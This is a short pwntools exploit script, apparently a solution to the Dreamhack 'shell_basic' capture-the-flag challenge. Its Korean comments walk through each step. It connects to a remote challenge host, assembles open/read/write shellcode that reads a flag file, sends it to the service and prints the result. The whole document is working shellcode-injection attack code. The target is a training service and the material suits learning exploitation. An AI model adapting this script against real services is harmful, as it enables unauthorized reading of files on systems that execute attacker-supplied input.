from pwn import *

p = remote("host1.dreamhack.games", 20000)

# 쉘 코드는 환경에 따라 영향을 받기 때문에, 먼저 아키텍처 정보를 x86-64로 지정해줍니다.
context.arch = "amd64"
# open할 flag 파일 path
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# open() 함수 결과는 rax 레지스터에 저장된다. → fd = rax
shellcode += shellcraft.read('rax', 'rsp', 0x30)	# read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)	# write(stdout, buf, 0x30)
shellcode = asm(shellcode)	# shellcode를 기계어로 변환

payload = shellcode
p.sendlineafter("shellcode: ", payload)
print(p.recv(0x30))

